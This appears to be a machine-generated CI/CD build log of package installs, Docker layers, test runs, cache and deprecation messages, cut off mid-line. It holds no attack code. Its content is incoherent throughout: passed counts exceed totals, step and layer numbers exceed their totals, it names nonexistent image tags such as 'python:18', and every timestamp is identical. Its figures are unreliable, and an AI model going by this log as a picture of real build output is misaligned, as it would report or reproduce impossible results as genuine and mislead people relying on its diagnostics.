/api - 201 (46ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache saved successfully\nStep 12/16: Installing dependencies\nPOST /data - 200 (302ms)\nTime: 115.325s\nArtifact uploaded: dist.zip (37MB)\nCoverage: 77% statements, 60% branches\nStep 5/19: Building\n[12:47:23] DEBUG: Memory usage: 944MB\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nVerifying...\nOptimizing 28 modules...\nReady.\nTLS handshake completed\nMinifying vendor.js\nBundling vendor.css\n\u2713 Step 'build' succeeded\nCache restored successfully (36MB)\nGenerating source maps...\nCache restored successfully (334MB)\nNODE_ENV=production\nOK\n[12:47:23] INFO: Connecting to database\nSuccess!\nCreating production build...\nInstalling express@3.8.8\nArtifact downloaded: 48MB\nStep 6/16: Running migrations\nBuilding Docker image...\nArtifact downloaded: 41MB\nLayer 9/8: RUN command\nFetching from https://gcr.io/package.json\nSnapshots: 6 passed, 19 total\nException: RuntimeError\n[12:47:23] INFO: Starting build process\nnpm install: added 51 packages\nImage pulled successfully\nPlatform: win32-x64\nUsing Python 3.11\nCompiling components/main.py...\nCompiling utils/main.py...\nCompiling components/service.java...\nStep 13/20: Building\nCache saved successfully\nTime: 77.192s\nStep 2/24: Testing\n[12:47:23] INFO: Cache refreshed\n[12:47:23] DEBUG: Initializing service\nFetching submodules...\n[12:47:23] WARN: Deprecated API usage\nGET /health - 201 (84ms)\nStep 1/25: Running migrations\n  PASS: integration/test_user_create.spec.js\n[12:47:23] INFO: Request completed\nPushing to registry...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCreating production build...\nAlready up to date.\npip: Downloading webpack-4.18.tar.gz\nCache invalidated: dependencies\n=== Step restore_cache completed ===\n=== Step: unit_tests ===\n\u2713 Task completed in 1285ms\nCompiling src/index.js...\nOptimizing 68 modules...\nFetching from https://googleapis.com/package.json\nBuilding Docker image...\n[12:47:23] INFO: Cache refreshed\n[12:47:23] INFO: Cache refreshed\n[12:47:23] ERROR: Connection failed\n[12:47:23] DEBUG: Initializing service\n\u2713 Task completed in 1305ms\nStep 7/25: Testing\nArtifact downloaded: 44MB\nCache restored successfully (363MB)\n[12:47:23] INFO: Connecting to database\nOK\n[12:47:23] INFO: Request completed\npip: Installing build dependencies...\nFAILED: test_auth_login\nGenerating source maps...\nWARNING: react has known vulnerabilities\nStep 6/15: Testing\n[12:47:23] WARN: Deprecated API usage\nUsing Node.js 19.2.7\nStep 20/22: Testing\nDone.\n[12:47:23] INFO: Processing request\nArtifact uploaded: dist.zip (12MB)\nProcessing...\nLayer 9/12: RUN command\n[12:47:23] DEBUG: Connection pool: 20 active\nArtifact uploaded: build.tar.gz (4MB)\n[12:47:23] INFO: Starting build process\nArtifact downloaded: 19MB\nVerifying...\nNODE_ENV=test\nTLS handshake completed\nStep 4/18: Running migrations\n\u2713 lint completed\n[12:47:23] DEBUG: Loading configuration\nWARNING: react has known vulnerabilities\nFetching from https://gcr.io/package.json\nWaiting...\nCreating production build...\nCompiling utils/service.java...\nTests: 63 passed, 128 total\n[12:47:23] INFO: Request completed\nStep 17/19: Deploying\nWARNING: lodash has known vulnerabilities\nUsing Node.js 14.14.7\nCompiling utils/utils.go...\nCompleted.\nProcessing...\nLayer 8/13: ENV command\nTest Suites: 23 passed, 11 total\nBundling styles.css\nnpm install: added 357 packages\npip: Collecting eslint\nProcessing...\nnpm notice: package.json updated\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nChecking out master branch\nFetching from https://googleapis.com/package.json\nCoverage: 86% statements, 81% branches\nNODE_ENV=production\nTLS handshake completed\nEnvironment: staging\n\u2713 build completed\nDone.\nStep 6/17: Linting\nCompiling src/service.java...\n\u2713 All checks passed\n[12:47:23] INFO: Processing request\nRan 83 tests in 58s\nUsing Python 3.9\nArtifact uploaded: dist.zip (43MB)\nnpm notice: created a lockfile\n[12:47:23] WARN: Deprecated API usage\nCache restored successfully (194MB)\n[12:47:23] INFO: Cache refreshed\nTests: 374 passed, 492 total\nOK\nOptimizing 23 modules...\nTest Suites: 13 passed, 31 total\npip: Downloading axios-3.13.tar.gz\n[12:47:23] ERROR: Connection failed\nCompiling src/main.py...\npip: Collecting axios\n  PASS: integration/test_cache_hit.spec.js\n[12:47:23] DEBUG: Loading configuration\n\u2713 package completed\nFinished.\n\u2713 Step 'install' succeeded\nUsing Python 3.10\nnpm install: added 156 packages\nCache invalidated: dependencies\nNODE_ENV=development\nPOST /upload - 200 (67ms)\n[12:47:23] INFO: Processing request\nnpm install: resolved 506 packages\nTransforming 949 files...\nTest Suites: 18 passed, 29 total\nBundling styles.css\n\u2713 package completed\nStep 10/16: Testing\nArtifact uploaded: dist.zip (48MB)\nConnection established\n[12:47:23] INFO: Starting build process\nWARNING: react has known vulnerabilities\nGenerating source maps...\nFetching submodules...\nTransforming 441 files...\nCache saved successfully\nPlatform: linux-x64\nBuilding Docker image...\nPushing to registry...\n[12:47:23] WARN: Deprecated API usage\nConnection established\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nPulling image: python:18\nCache invalidated: dependencies\nArtifact uploaded: build.tar.gz (19MB)\nWARNING: express has known vulnerabilities\nOK\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nSnapshots: 42 passed, 5 total\nnpm install: added 275 packages\nVerifying...\nUsing Node.js 18.7.5\nCache miss for key-7642\nImage pulled successfully\nCache hit for key-4282\n\u2713 All checks passed\n\u2717 build failed with exit code 11\nArtifact uploaded: build.tar.gz (21MB)\nSwitched to branch 'bugfix/task-237'\nMinifying main.js\nImage pulled successfully\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nPulling image: node:18\npip: Installing build dependencies...\nFetching from https://pypi.org/package.json\nUsing Node.js 16.4.7\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nSuccess!\nPOST /upload - 201 (469ms)\n[12:47:23] DEBUG: Connection pool: 12 active\npip install: Successfully installed jest-2.2\n[12:47:23] DEBUG: Memory usage: 1076MB\nPushing to registry...\n[12:47:23] ERROR: Connection failed\n  PASS: test_auth_login (245ms)\nnpm install: resolved 734 packages\n[12:47:23] DEBUG: Query executed in 62ms\nProcessing...\n\u2713 package completed\nnpm notice: package.json updated\nTime: 16.62s\n  PASS: e2e/test_cache_hit.spec.js\nStep 4/23: Building\n[12:47:23] WARN: Deprecated API usage\nFAILED: test_api_health\nGET /health - 204 (50ms)\nSwitched to branch 'bugfix/task-111'\n[12:47:23] INFO: Request completed\nnpm install: added 312 packages\nCache invalidated: build\n[12:47:23] INFO: Cache refreshed\n[12:47:23] DEBUG: Memory usage: 553MB\nnpm install: resolved 831 packages\nHEAD is now at 49bc237\nCreating production build...\nInstalling jest@5.20.10\nLayer 10/10: RUN command\nCache saved successfully\nReady.\nTransforming 104 files...\nStep 18/24: Testing\nMinifying app.js\nTLS handshake completed\nCreating production build...\n[12:47:23] DEBUG: Memory usage: 1819MB\nLayer 10/9: COPY command\n=== Step unit_tests completed ===\n=== Step: setup_node ===\nGET /api - 204 (3ms)\nTests: 483 passed, 469 total\n\u2713 Task completed in 3682ms\nLayer 9/9: COPY command\nStep 4/21: Linting\nCompiling utils/handler.rs...\n\u2713 All checks passed\n\u2713 lint completed\n\u2713 deploy completed\nUploading artifact 'coverage' (45 files)\nNODE_ENV=development\nWARNING: express has known vulnerabilities\nStep 12/20: Deploying\npip: Installing build dependencies...\nDone.\n[12:47:23] DEBUG: Connection pool: 3 active\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n  PASS: e2e/test_auth_login.spec.js\npip install: Successfully installed lodash-3.14\n\u2713 validate completed\nPulling image: alpine:3.11\nNODE_ENV=development\nStep 14/18: Linting\nCompiling utils/handler.rs...\nCompiling utils/service.java...\nTime: 48.766s\nnpm notice: created a lockfile\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nPushing to registry...\n[12:47:23] WARN: Deprecated API usage\n  PASS: e2e/test_cache_hit.spec.js\nImage pulled successfully\nPulling image: alpine:18\nCache saved successfully\nOK\nSwitched to branch 'bugfix/task-246'\n[12:47:23] DEBUG: Query executed in 81ms\n\u2713 build completed\npip: Installing build dependencies...\n\u2713 Step 'test' succeeded\nUsing Node.js 15.2.4\nCache miss for key-7586\n  PASS: test_api_health (186ms)\n[12:47:23] DEBUG: Initializing service\nTests: 427 passed, 312 total\nUploading artifact 'dist' (47 files)\n  PASS: test_db_connect (155ms)\nGenerating source maps...\n[12:47:23] DEBUG: Memory usage: 131MB\nInstalling webpack@5.17.4\n  PASS: test_user_create (252ms)\n[12:47:23] ERROR: Connection failed\nGET /health - 204 (22ms)\nDone.\n\u2717 build failed with exit code 106\nStep 1/24: Linting\nArtifact uploaded: build.tar.gz (3MB)\nPlatform: win32-x64\n[12:47:23] INFO: Cache refreshed\nTransforming 179 files...\nFAILED: test_user_create\nCompiling utils/index.js...\nException: ValueError\nAlready up to date.\n\u2713 All checks passed\nSnapshots: 41 passed, 19 total\nTLS handshake completed\nFetching from https://npmjs.org/package.json\nImage pulled successfully\nHEAD is now at 760250e\npip: Installing build dependencies...\nPlatform: win32-x64\nInstalling express@1.7.7\nDone.\nWaiting...\nCache saved successfully\nTime: 80.918s\n[12:47:23] INFO: Connecting to database\n[12:47:23] DEBUG: Connection pool: 7 active\nStep 8/22: Building\nChecking out master branch\n[12:47:23] WARN: Deprecated API usage\nCompiling src/main.py...\nPlatform: linux-x64\nTransforming 549 files...\nCache invalidated: node_modules\nBuilding Docker image...\n[12:47:23] DEBUG: Query executed in 41ms\nArtifact uploaded: build.tar.gz (28MB)\nPulling image: alpine:18\n[12:47:23] INFO: Processing request\n  PASS: test_user_create (397ms)\nyarn add: Done in 28.30s\nWARNING: webpack has known vulnerabilities\nWaiting...\nFAILED: test_db_connect\nRan 161 tests in 16s\nnpm install: resolved 1574 packages\n[12:47:23] INFO: Connecting to database\nPushing to registry...\nImage pulled successfully\nUploading artifact 'coverage' (9 files)\nVerifying...\nCompiling utils/service.java...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 20/24: Building\nGET /health - 204 (55ms)\nCache invalidated: dependencies\n\u2713 Step 'install' succeeded\nnpm notice: package.json updated\nCompiling src/app.ts...\n\u2713 deploy completed\nReady.\nOptimizing 72 modules...\nGenerating source maps...\nArtifact downloaded: 40MB\n\u2713 All checks passed\nPulling image: node:latest\nTests: 222 passed, 226 total\nCache hit for key-3583\n[12:47:23] WARN: Deprecated API usage\nTLS handshake completed\nLoading...\nnpm notice: created a lockfile\nVerifying...\nStep 11/19: Deploying\n[12:47:23] DEBUG: Loading configuration\n[12:47:23] INFO: Cache refreshed\nCache miss for key-1303\nnpm install: added 249 packages\nnpm install: added 86 packages\npip: Downloading axios-2.0.tar.gz\nWaiting...\nCache hit for key-8601\nCache saved successfully\nInstalling axios@2.3.4\n\u2713 Task completed in 4145ms\n[12:47:23] ERROR: Connection failed\nReady.\n  PASS: integration/test_db_connect.spec.js\nnpm install: resolved 546 packages\nFinished.\nGET /health - 201 (28ms)\nLayer 3/11: ENV command\nDone.\nUsing Node.js 18.19.10\npip: Downloading jest-5.18.tar.gz\nDone.\nStep 11/23: Building\nWARNING: axios has known vulnerabilities\n\u2713 All checks passed\nInstalling lodash@1.14.0\nOK\n  PASS: integration/test_auth_login.spec.js\nVerifying...\nBuilding Docker image...\n[12:47:23] WARN: Deprecated API usage\nStep 2/17: Deploying\nFetching from https://github.com/package.json\nGenerating source maps...\n[12:47:23] DEBUG: Query executed in 75ms\nPulling image: node:3.11\n[12:47:23] INFO: Processing request\nFAILED: test_cache_hit\nStep 15/24: Linting\nCreating production build...\nSuccess!\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nGET /health - 200 (20ms)\nTest Suites: 14 passed, 41 total\npip: Downloading react-1.1.tar.gz\nCreating production build...\nChecking out main branch\nDone.\nDone.\n[12:47:23] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nnpm notice: package.json updated\nCache invalidated: node_modules\n[12:47:23] WARN: Deprecated API usage\n  PASS: test_user_create (159ms)\n\u2713 Step 'install' succeeded\n=== Step setup_node completed ===\n=== Step: save_cache ===\nLoading...\nImage pulled successfully\n\u2713 All checks passed\nSuccess!\n[12:47:23] WARN: Deprecated API usage\n[12:47:23] DEBUG: Connection pool: 2 active\nPushing to registry...\nPushing to registry...\nFetching from https://amazonaws.com/package.json\nCreating production build...\npip install: Successfully installed eslint-4.7\n[12:47:23] DEBUG: Connection pool: 6 active\nCache restored successfully (308MB)\nTLS handshake completed\nCompiling components/handler.rs...\nArtifact uploaded: dist.zip (93MB)\nPOST /api - 201 (469ms)\nCompleted.\nWARNING: axios has known vulnerabilities\nCompiling lib/app.ts...\nBuilding Docker image...\n[12:47:23] ERROR: Connection failed\npip: Downloading prettier-3.2.tar.gz\nOK\n[12:47:23] DEBUG: Connection pool: 1 active\nInstalling express@2.12.7\nBundling styles.css\nSuccess!\nAlready up to date.\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nTime: 110.891s\nFetching from https://github.com/package.json\nFAILED: test_db_connect\nFAILED: test_cache_hit\nCompiling utils/utils.go...\nEnvironment: production\nPlatform: darwin-arm64\nChecking out develop branch\n\u2713 Step 'test' succeeded\n[12:47:23] DEBUG: Query executed in 77ms\nRan 42 tests in 55s\n[12:47:23] DEBUG: Initializing service\nCompiling utils/app.ts...\n[12:47:23] INFO: Processing request\nPushing to registry...\n[12:47:23] INFO: Processing request\nEnvironment: staging\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:47:23] DEBUG: Initializing service\n[12:47:23] WARN: Deprecated API usage\nPlatform: linux-x64\nnpm install: added 185 packages\nyarn add: Done in 21.89s\nCache invalidated: dependencies\nFetching submodules...\nnpm notice: created a lockfile\nCreating production build...\nUploading artifact 'dist' (48 files)\nTests: 113 passed, 293 total\nPushing to registry...\nArtifact downloaded: 26MB\nAlready up to date.\nGET /health - 204 (63ms)\n\u2713 test completed\nCache saved successfully\nLayer 6/13: RUN command\nProcessing...\n  PASS: test_auth_login (303ms)\nFetching from https://githubusercontent.com/package.json\n[12:47:23] DEBUG: Memory usage: 341MB\nTest Suites: 31 passed, 30 total\nGET /health - 201 (3ms)\n\u2713 All checks passed\nSwitched to branch 'hotfix/task-924'\nSuccess!\nCompleted.\nStep 6/18: Deploying\nUsing Node.js 16.9.5\nyarn add: Done in 10.6s\nAlready up to date.\n[12:47:23] DEBUG: Initializing service\nHEAD is now at 376b3ec\n[12:47:23] DEBUG: Initializing service\n[12:47:23] DEBUG: Query executed in 26ms\nGET /api - 201 (65ms)\nBuilding Docker image...\nBundling styles.js\nPOST /api - 200 (354ms)\nInstalling axios@5.4.5\nGenerating source maps...\nStep 11/21: Building\n[12:47:23] INFO: Processing request\nLoading...\nCreating production build...\n  PASS: test_auth_login (201ms)\nStep 10/21: Testing\nStep 9/22: Deploying\npip: Collecting express\nSwitched to branch 'feature/task-730'\nFetching submodules...\n\u2713 All checks passed\nProcessing...\nLoading...\n\u2713 Task completed in 1806ms\nStep 17/17: Deploying\nHEAD is now at a218abe\nStep 8/22: Testing\nImage pulled successfully\n\u2713 lint completed\nCache hit for key-3087\nTests: 112 passed, 311 total\nStep 9/15: Linting\nStep 11/18: Installing dependencies\nBundling styles.js\nDone.\nUploading artifact 'build' (26 files)\n[12:47:23] WARN: Deprecated API usage\nnpm notice: created a lockfile\nCompleted.\nFetching from https://amazonaws.com/package.json\nImage pulled successfully\nUsing Node.js 14.17.0\nStep 20/15: Installing dependencies\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nProcessing...\n[12:47:23] DEBUG: Loading configuration\n  PASS: test_api_health (177ms)\n[12:47:23] INFO: Cache refreshed\nCache miss for key-6249\nCompiling components/index.js...\nnpm install: resolved 1433 packages\n[12:47:23] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 6/18: Testing\nConnection established\nLayer 6/8: RUN command\nPlatform: linux-x64\n\u2713 Task completed in 663ms\nArtifact uploaded: dist.zip (49MB)\nOptimizing 87 modules...\n[12:47:23] WARN: Deprecated API usage\nVerifying...\nUsing Node.js 14.15.8\n[12:47:23] WARN: Deprecated API usage\nDone.\nLoading...\nInstalling react@2.11.0\nVerifying...\nGET /health - 200 (27ms)\nStep 19/15: Running migrations\nMinifying main.js\nnpm notice: package.json updated\nStep 15/22: Testing\n[12:47:23] WARN: Deprecated API usage\nHEAD is now at 1c98cd4\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 lint completed\nException: RuntimeError\nOK\n[12:47:23] INFO: Starting build process\nOptimizing 61 modules...\nBuilding Docker image...\nRan 152 tests in 12s\nRan 22 tests in 2s\nBuilding Docker image...\nImage pulled successfully\nGenerating source maps...\n[12:47:23] WARN: Deprecated API usage\nUsing Python 3.9\n  PASS: unit/test_api_health.spec.js\nCache miss for key-7792\nOK\nWaiting...\nVerifying...\nImage pulled successfully\n  PASS: test_db_connect (59ms)\nCache miss for key-9751\n[12:47:23] INFO: Connecting to database\nPushing to registry...\npip install: Successfully installed axios-1.11\nFinished.\nCompiling components/utils.go...\nTests: 431 passed, 246 total\n=== Step save_cache completed ===\n=== Step: e2e_tests ===\n[12:47:23] DEBUG: Query executed in 28ms\nnpm install: added 188 packages\npip: Installing build dependencies...\n[12:47:23] INFO: Connecting to database\nnpm notice: created a lockfile\nCache saved successfully\nyarn add: Done in 16.58s\nImage pulled successfully\nStep 8/16: Installing dependencies\npip: Collecting lodash\nCache invalidated: dependencies\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:47:23] DEBUG: Memory usage: 1690MB\nTest Suites: 46 passed, 25 total\nTLS handshake completed\nStep 8/15: Running migrations\n[12:47:23] DEBUG: Connection pool: 18 active\nVerifying...\n[12:47:23] DEBUG: Query executed in 80ms\nBuilding Docker image...\nStep 11/17: Installing dependencies\nFinished.\nInstalling prettier@5.18.4\nProcessing...\n  PASS: unit/test_user_create.spec.js\nHEAD is now at 3d4f823\nGenerating source maps...\nnpm install: resolved 661 packages\nUsing Python 3.10\nTransforming 291 files...\nPlatform: linux-x64\nWaiting...\nTLS handshake completed\nAlready up to date.\nWARNING: lodash has known vulnerabilities\nSnapshots: 32 passed, 10 total\nStep 6/16: Building\nMinifying main.js\n\u2717 build failed with exit code 18\n[12:47:23] INFO: Starting build process\nnpm install: added 418 packages\n  PASS: test_cache_hit (424ms)\nImage pulled successfully\nEnvironment: staging\nCoverage: 74% statements, 63% branches\nStep 14/15: Installing dependencies\nUsing Python 3.12\nCompleted.\nProcessing...\nOK\nVerifying...\nTLS handshake completed\nPulling image: node:18\nWARNING: jest has known vulnerabilities\nCache hit for key-8185\nnpm install: added 406 packages\nCompiling lib/utils.go...\nStep 4/22: Installing dependencies\nStep 7/18: Running migrations\nnpm notice: created a lockfile\nAlready up to date.\n[12:47:23] DEBUG: Memory usage: 1390MB\nSwitched to branch 'bugfix/task-562'\nUsing Node.js 19.14.9\nNODE_ENV=production\n[12:47:23] ERROR: Connection failed\nStep 13/19: Installing dependencies\nStep 5/25: Linting\nCoverage: 88% statements, 87% branches\nOK\nRan 125 tests in 24s\n[12:47:23] WARN: Deprecated API usage\nCreating production build...\nCache miss for key-1400\nOK\nTLS handshake completed\n\u2713 Step 'checkout' succeeded\nCreating production build...\nInstalling axios@2.0.3\npip install: Successfully installed react-4.12\nStep 20/23: Testing\nChecking out main branch\nWARNING: axios has known vulnerabilities\n[12:47:23] DEBUG: Loading configuration\nLoading...\nBundling vendor.css\n[12:47:23] DEBUG: Query executed in 44ms\nOK\nAlready up to date.\n\u2713 Step 'setup' succeeded\nCache restored successfully (236MB)\nCompiling src/service.java...\n[12:47:23] DEBUG: Loading configuration\nyarn add: Done in 25.26s\n\u2717 build failed with exit code 79\nOptimizing 53 modules...\n[12:47:23] ERROR: Connection failed\nCache saved successfully\nCoverage: 82% statements, 64% branches\nCache restored successfully (247MB)\nFinished.\nRan 62 tests in 7s\n\u2713 Step 'install' succeeded\nWARNING: lodash has known vulnerabilities\npip: Installing build dependencies...\npip install: Successfully installed webpack-5.11\nSwitched to branch 'bugfix/task-109'\nWARNING: prettier has known vulnerabilities\nCompiling utils/app.ts...\n[12:47:23] INFO: Cache refreshed\n[12:47:23] INFO: Request completed\n[12:47:23] WARN: Deprecated API usage\n[12:47:23] INFO: Starting build process\nChecking out master branch\npip install: Successfully installed axios-2.16\nPushing to registry...\nGenerating source maps...\nStep 18/22: Deploying\nAlready up to date.\nStep 5/23: Deploying\nCache restored successfully (123MB)\n  PASS: integration/test_cache_hit.spec.js\nGET /status - 201 (56ms)\nyarn add: Done in 29.16s\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nGET /api - 201 (54ms)\n[12:47:23] DEBUG: Loading configuration\nPlatform: win32-x64\nPushing to registry...\nMinifying vendor.js\nTLS handshake completed\nStep 10/23: Deploying\nStep 7/16: Installing dependencies\n[12:47:23] INFO: Cache refreshed\nReady.\n[12:47:23] INFO: Processing request\nnpm notice: package.json updated\nMinifying app.js\n  PASS: e2e/test_api_health.spec.js\nFinished.\nOptimizing 36 modules...\n[12:47:23] INFO: Cache refreshed\nCache invalidated: build\npip: Collecting webpack\nStep 6/24: Building\n\u2713 Task completed in 2563ms\nArtifact downloaded: 20MB\npip: Downloading prettier-2.12.tar.gz\nCreating production build...\nDone.\nnpm install: added 443 packages\nLayer 4/15: COPY command\nImage pulled successfully\nnpm install: added 50 packages\nArtifact uploaded: dist.zip (95MB)\nnpm install: resolved 1765 packages\nTest Suites: 33 passed, 35 total\nStep 12/22: Testing\nEnvironment: staging\nTest Suites: 9 passed, 39 total\nSwitched to branch 'bugfix/task-821'\nUploading artifact 'build' (43 files)\nEnvironment: development\nSnapshots: 5 passed, 44 total\nFinished.\nGET /status - 204 (80ms)\nFetching submodules...\n[12:47:23] DEBUG: Loading configuration\n[12:47:23] INFO: Cache refreshed\nSuccess!\npip: Installing build dependencies...\nUploading artifact 'coverage' (26 files)\n  PASS: unit/test_cache_hit.spec.js\n[12:47:23] ERROR: Connection failed\nTLS handshake completed\n\u2713 Task completed in 3640ms\npip: Installing build dependencies...\n[12:47:23] ERROR: Connection failed\npip: Downloading webpack-4.3.tar.gz\nGenerating source maps...\n[12:47:23] WARN: Deprecated API usage\n\u2713 Task completed in 4660ms\nCoverage: 82% statements, 77% branches\n=== Step e2e_tests completed ===\n=== Step: integration_tests ===\nCoverage: 76% statements, 69% branches\n[12:47:23] INFO: Processing request\nSwitched to branch 'bugfix/task-422'\nBundling vendor.js\n[12:47:23] DEBUG: Query executed in 29ms\nSwitched to branch 'hotfix/task-614'\n[12:47:23] INFO: Connecting to database\npip: Downloading jest-1.1.tar.gz\n[12:47:23] INFO: Request completed\nTests: 106 passed, 409 total\nPlatform: linux-x64\n[12:47:23] INFO: Cache refreshed\nCache invalidated: node_modules\nConnection established\nBundling vendor.css\nPOST /upload - 202 (463ms)\n[12:47:23] INFO: Connecting to database\n[12:47:23] DEBUG: Loading configuration\n[12:47:23] INFO: Processing request\nCompiling components/app.ts...\nPlatform: win32-x64\nFetching from https://docker.io/package.json\nConnection established\nSnapshots: 6 passed, 7 total\n[12:47:23] INFO: Processing request\nGenerating source maps...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\npip: Downloading express-5.11.tar.gz\nSnapshots: 16 passed, 6 total\n[12:47:23] INFO: Cache refreshed\nCoverage: 89% statements, 78% branches\nWARNING: react has known vulnerabilities\nCompiling components/app.ts...\n\u2717 build failed with exit code 112\n[12:47:23] DEBUG: Loading configuration\nAlready up to date.\nUploading artifact 'dist' (12 files)\n[12:47:23] DEBUG: Connection pool: 3 active\nTest Suites: 19 passed, 48 total\n\u2713 test completed\nTest Suites: 42 passed, 31 total\nStep 20/20: Running migrations\nFetching submodules...\nCompiling utils/app.ts...\n[12:47:23] DEBUG: Initializing service\nTime: 48.9s\n  PASS: test_api_health (444ms)\nWARNING: prettier has known vulnerabilities\nnpm install: added 196 packages\n[12:47:23] INFO: Starting build process\n\u2717 build failed with exit code 60\nnpm install: resolved 1110 packages\nStep 14/25: Installing dependencies\nStep 20/16: Running migrations\nUsing Python 3.9\nChecking out master branch\nTest Suites: 44 passed, 41 total\nChecking out main branch\nnpm notice: package.json updated\nPushing to registry...\nCache hit for key-7517\nStep 17/25: Installing dependencies\nGenerating source maps...\nSwitched to branch 'hotfix/task-146'\nSwitched to branch 'hotfix/task-605'\nPulling image: alpine:latest\nStep 20/21: Installing dependencies\nTest Suites: 50 passed, 40 total\nSnapshots: 5 passed, 8 total\nSuccess!\n[12:47:23] INFO: Connecting to database\nCache hit for key-6619\nTest Suites: 15 passed, 15 total\n\u2717 build failed with exit code 105\n[12:47:23] INFO: Cache refreshed\nGET /api - 200 (9ms)\nLayer 5/9: ENV command\nCompiling utils/service.java...\nMinifying vendor.js\n[12:47:23] INFO: Cache refreshed\nUsing Python 3.9\nStep 14/15: Testing\nFetching from https://npmjs.org/package.json\n[12:47:23] DEBUG: Initializing service\nStep 20/21: Linting\nTests: 347 passed, 438 total\nOptimizing 65 modules...\nCache miss for key-1558\nUploading artifact 'build' (16 files)\nUsing Python 3.10\n[12:47:23] INFO: Processing request\n[12:47:23] DEBUG: Query executed in 6ms\npip: Downloading lodash-2.14.tar.gz\n[12:47:23] DEBUG: Query executed in 24ms\nnpm notice: created a lockfile\nnpm install: resolved 458 packages\nCompiling lib/index.js...\nTests: 144 passed, 181 total\nUploading artifact 'build' (38 files)\nPushing to registry...\nImage pulled successfully\n[12:47:23] WARN: Deprecated API usage\npip: Downloading prettier-5.7.tar.gz\nVerifying...\nCache restored successfully (23MB)\nCache hit for key-6494\nWaiting...\nnpm install: resolved 1178 packages\nnpm notice: package.json updated\nHEAD is now at 74bf537\nnpm notice: created a lockfile\n  PASS: test_api_health (450ms)\nException: ValueError\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nnpm notice: package.json updated\nCache miss for key-2696\nPulling image: python:18\nCompleted.\nEnvironment: staging\nTest Suites: 36 passed, 9 total\n\u2713 All checks passed\n[12:47:23] INFO: Connecting to database\n\u2713 Step 'test' succeeded\nnpm notice: package.json updated\nProcessing...\nEnvironment: production\nCache hit for key-7056\nnpm install: resolved 394 packages\n[12:47:23] WARN: Deprecated API usage\nStep 15/15: Deploying\nStep 12/24: Testing\nUsing Python 3.12\nWARNING: jest has known vulnerabilities\nPlatform: darwin-arm64\n[12:47:23] WARN: Deprecated API usage\nTests: 393 passed, 392 total\nyarn add: Done in 6.66s\nNODE_ENV=development\nCoverage: 96% statements, 89% branches\nBuilding Docker image...\nFetching from https://pypi.org/package.json\nCache restored successfully (475MB)\nWARNING: express has known vulnerabilities\nCompiling src/main.py...\npip install: Successfully installed webpack-3.0\nDone.\nFetching submodules...\n\u2713 Task completed in 3844ms\npip: Installing build dependencies...\n  PASS: test_auth_login (385ms)\nMinifying app.js\nArtifact downloaded: 35MB\nLoading...\nGET /health - 204 (57ms)\n[12:47:23] WARN: Deprecated API usage\nCache miss for key-4659\nUploading artifact 'build' (29 files)\nTests: 406 passed, 454 total\n[12:47:23] DEBUG: Loading configuration\nCompleted.\nGET /api - 200 (83ms)\nTransforming 198 files...\nCompleted.\nTransforming 554 files...\nCompiling utils/utils.go...\n[12:47:23] DEBUG: Connection pool: 20 active\nPlatform: linux-x64\n[12:47:23] INFO: Request completed\n\u2713 All checks passed\nStep 15/24: Installing dependencies\nProcessing...\n  PASS: e2e/test_cache_hit.spec.js\n\u2717 build failed with exit code 33\n[12:47:23] ERROR: Connection failed\nProcessing...\nyarn add: Done in 5.97s\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompleted.\nFinished.\nCompiling components/app.ts...\nTime: 70.77s\nFetching submodules...\nPlatform: win32-x64\n=== Step integration_tests completed ===\n=== Step: type_check ===\nGET /status - 200 (63ms)\nVerifying...\nHEAD is now at 3874f77\nStep 16/16: Installing dependencies\nCache hit for key-8982\nSnapshots: 31 passed, 28 total\nHEAD is now at 7fb9309\nOptimizing 11 modules...\n[12:47:23] DEBUG: Query executed in 74ms\nStep 15/24: Installing dependencies\nPushing to registry...\n[12:47:23] ERROR: Connection failed\nChecking out master branch\nArtifact downloaded: 24MB\nCompiling lib/app.ts...\nnpm notice: package.json updated\nPulling image: node:18\n[12:47:23] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:47:23] ERROR: Connection failed\nTest Suites: 7 passed, 15 total\nSuccess!\n[12:47:23] DEBUG: Memory usage: 882MB\nImage pulled successfully\npip install: Successfully installed express-1.15\nConnection established\npip install: Successfully installed eslint-5.7\nStep 17/15: Building\nSnapshots: 41 passed, 30 total\nDone.\nCreating production build...\nOptimizing 44 modules...\n\u2713 Task completed in 3722ms\nCompleted.\n\u2713 Step 'checkout' succeeded\nUploading artifact 'build' (50 files)\nOK\nArtifact uploaded: build.tar.gz (5MB)\nArtifact downloaded: 48MB\n[12:47:23] DEBUG: Query executed in 38ms\n[12:47:23] DEBUG: Connection pool: 19 active\n[12:47:23] INFO: Processing request\nVerifying...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n  PASS: e2e/test_api_health.spec.js\n\u2713 package completed\n  PASS: e2e/test_auth_login.spec.js\nFetching from https://amazonaws.com/package.json\nCompiling components/app.ts...\npip: Downloading lodash-2.11.tar.gz\n[12:47:23] WARN: Deprecated API usage\n[12:47:23] INFO: Starting build process\nSwitched to branch 'feature/task-621'\nFAILED: test_db_connect\nCreating production build...\nCache invalidated: dependencies\n[12:47:23] DEBUG: Connection pool: 12 active\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nSnapshots: 9 passed, 12 total\nDone.\nCache 